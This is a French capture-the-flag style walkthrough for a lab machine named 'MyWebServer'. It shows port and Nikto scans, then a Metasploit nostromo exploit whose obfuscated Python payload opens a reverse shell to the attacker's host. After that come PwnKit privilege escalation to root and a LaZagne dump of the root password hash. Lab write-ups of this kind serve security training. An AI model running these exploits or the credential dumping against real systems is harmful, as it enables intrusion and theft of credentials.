# MyWebServer

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.95
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.95...100%
[+] Scan Nmap 192.168.56.95...100%
 
[+] 80/tcp open
[+] 3306/tcp open
[+] 8080/tcp open
[+] 8009/tcp open
[+] 2222/tcp open
[+] 8081/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.95-tcp.html      |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">👽</span> Nikto**

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $nikto -url http://192.168.56.95:2222 -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.95
+ Target Hostname:    192.168.56.95
+ Target Port:        2222
+ Start Time:         2025-02-15 19:51:56 (GMT1)
---------------------------------------------------------------------------
+ Server: nostromo 1.9.6
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /cgi-bin/: Directory indexing found.
+ /cgi-bin/printenv: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated: 20 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-02-15 19:56:48 (GMT1) (292 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - nostromo_code_exec**

Exploitation d’une vulnérabilité du serveur

```
[msf](Jobs:0 Agents:0) exploit(multi/http/nostromo_code_exec) >> set lhost 192.168.56.104
lhost => 192.168.56.104
[msf](Jobs:0 Agents:0) exploit(multi/http/nostromo_code_exec) >> set rport 2222
rport => 2222
[msf](Jobs:0 Agents:0) exploit(multi/http/nostromo_code_exec) >> set rhosts 192.168.56.95
rhosts => 192.168.56.95
[msf](Jobs:0 Agents:0) exploit(multi/http/nostromo_code_exec) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(multi/http/nostromo_code_exec) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/python/meterpreter/reverse_tcp command payload
[*] Generated command payload: echo exec\(__import__\(\'zlib\'\).decompress\(__import__\(\'base64\'\).b64decode\(__import__\(\'codecs\'\).getencoder\(\'utf-8\'\)\(\'eNo9UE1LxDAQPTe/IrckGEO7dMvuYgURDyIiuHsTkTYZNTRNQ5LVqvjfbcjiHGZ4M2/efOjRTT7iMMkBIv82uud9F6CpeYj+KCOPegT0Onk8Y22x7+wb0KpkO1RE/7X4IrS5WeRAV/yE9w/Xdy/7w+PN1T1LPCEna0FGSkm1XYmq2Yh1I6qyJrxejCVS76EbUAGzBBeTehovggFwdM2QafNW4mhdJwdKLm8JD8KD/KCLwFP5jFR7woahz3dtABuwVLELs8ips//qeU4zBDNImg4XCuQ0Og8h0PwD0Td1SipITP5DAtmFX4b+AG8CX2k\=\'\)\[0\]\)\)\) | exec $(which python || which python3 || which python2) -
[*] Sending stage (24772 bytes) to 192.168.56.95
[*] Meterpreter session 2 opened (192.168.56.104:4444 -> 192.168.56.95:49210) at 2025-02-15 19:56:35 +0100

(Meterpreter 2)(/usr/bin) > getuid

```

&nbsp;

<span style="color: #dddddd;">🤖</span> **Linpeas**
Cherhons une des vulns
```
daemon@webserver:/tmp$ sh linpeas.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

<span style="color: #dddddd;">💀</span> **PwnKit**

Élévation de privilège

```
daemon@webserver:/tmp$ ./PwnKit
./PwnKit
bash -i
bash: cannot set terminal process group (2045): Inappropriate ioctl for device
bash: no job control in this shell
root@webserver:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

&nbsp;

<span style="color: #dddddd;">👾</span> **LaZagne**

Cherchons les mot de passe sur la machine

```
root@webserver:/tmp/LaZagne-2.4.6/Linux# python laZagne.py all   

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$ULGH0zeaH2bIaDja$n5xsSSGRJVipBlhsFs/JAUa6bgfMYiAe44ZBdD5uG592qznGg7SqyLYHqJyR5DbHyYVeIg0sddEDyGitGuvFj.:18352:0:99999:7:::


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.21433997154
root@webserver:/tmp/LaZagne-2.4.6/Linux# 
```
